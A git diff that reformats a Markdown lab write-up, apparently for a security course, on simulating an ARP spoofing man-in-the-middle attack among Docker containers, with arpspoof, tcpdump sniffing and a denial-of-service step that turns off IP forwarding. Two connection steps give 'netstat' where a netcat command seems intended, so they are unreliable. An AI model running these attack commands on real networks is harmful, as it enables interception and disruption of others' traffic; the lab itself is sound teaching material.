@@ -4,45 +4,47 @@
 
 Setup the controlled environment in which the attack will be simulated.
 
-1. Cloning the git repo and entering the directory: 
+1. Clone the git repo: 
     
-    `git clone [https://github.com/mcagalj/SRP-2021-22](https://github.com/mcagalj/SRP-2021-22)`
+        git clone https://github.com/mcagalj/SRP-2021-22
+
+2. Enter the directory:
+        
+        cd SRP-2021-22/arp-spoofing
     
-    `cd SRP-2021-22/arp-spoofing`
+3. Starting docker containers:
     
-2. Starting docker containers:
+        ./start.sh
     
-    `./start.sh`
+4. Enter docker container with an interactive terminal:
     
-3. Enter docker container with an interactive terminal:
+        docker exec -it <container-name> bash
     
-    `docker exec -it <container-name> bash`
+5. Check if the network between containers is up (from station-1):
     
-4. Check if the network between containers is up
+        ping station-2
     
-    `ping station-2` (from station-1)
+6. Find IP and MAC addresses of each docker container:
     
-5. Find IP and MAC addresses of each docker container:
+        ifconfig -a
+
+    **station-1:**
     
-    `ifconfig -a`
+        IP: 172.22.0.2
+        
+        MAC: 02:42:ac:16:00:02
     
-    **Station-1:**
+    **station-2:**
     
-    IP: `172.22.0.2`
+        IP: 172.22.0.4
+        
+        MAC: 02:42:ac:16:00:04
     
-    MAC: `02:42:ac:16:00:02`
+    **evil-station:**
     
-    **Station-2:**
-    
-    IP: `172.22.0.4`
-    
-    MAC: `02:42:ac:16:00:04`
-    
-    **Evil-Station:**
-    
-    IP: `172.22.0.3`
-    
-    MAC: `02:42:ac:16:00:03`
+        IP: 172.22.0.3
+        
+        MAC: 02:42:ac:16:00:03
     
 
 ### Emulating a 'real' situation
@@ -51,11 +53,15 @@ Emulation of a conversation between two computers, in our case containers on the
 
 1. To open connection between **station-1** and **station-2**:
     
-    On **station-2**: `netstat -l -p 8000`
+    On **station-2**: 
+    
+        netstat -l -p 8000
     
     **station-2** behaves like a server listening for connections
     
-    On **station-1**: `netstat station-2 8000`
+    On **station-1**: 
+    
+        netstat station-2 8000
     
     **station-1** behaves like a client requesting to connect to **station-2**
     
@@ -66,18 +72,18 @@ In the controlled environment that was set up, emulate an attack.
 
 1. Listen traffic on **eth0** (network on which all containers are connected on) on **evil-station**:
     
-    `tcpdump`
+        tcpdump
     
 2. Perform ARP spoofing:
     
-    `arpspoof -t station-1 -r station-2`
+        arpspoof -t station-1 -r station-2
     
 3. To filter `tcpdump` output:
     
-    `tcpdump -XA station-1 and not arp`
+        tcpdump -XA station-1 and not arp
     
 4. DOS between **station-1** and **station-2**:
     
-    `echo 0 > /proc/sys/net/ipv4/ip_forward`
+        echo 0 > /proc/sys/net/ipv4/ip_forward
     
     Stop IP forwarding from **evil-station** to **station-2 →** results in messages not being forwared to **station-2,** also consequently TCP connection breaks down since **station-1** can't send ACK signal to **station-2**
